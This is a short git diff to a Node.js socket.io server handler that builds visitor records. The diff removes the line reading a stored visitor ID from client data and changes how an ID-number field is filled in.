@@ -400,7 +400,7 @@ io.on("connection", (socket) => {
     const { os, device, browser } = parseUserAgent(visitorInfo.userAgent);
     
     // Get existing visitor ID from client (localStorage)
-    const existingVisitorId = data?.existingVisitorId;
+
     
     // Check if this visitor already exists based on visitor ID from localStorage
     let existingVisitor = null;
@@ -453,7 +453,7 @@ io.on("connection", (socket) => {
         isRead: false,
         fullName: "",
         phone: "",
-        idNumber: data?.idNumber || "", // Capture idNumber from client data
+        idNumber: idNumber || "", // Capture idNumber from client data
         arabicName: "",
         englishName: "",
         dateOfBirth: "",
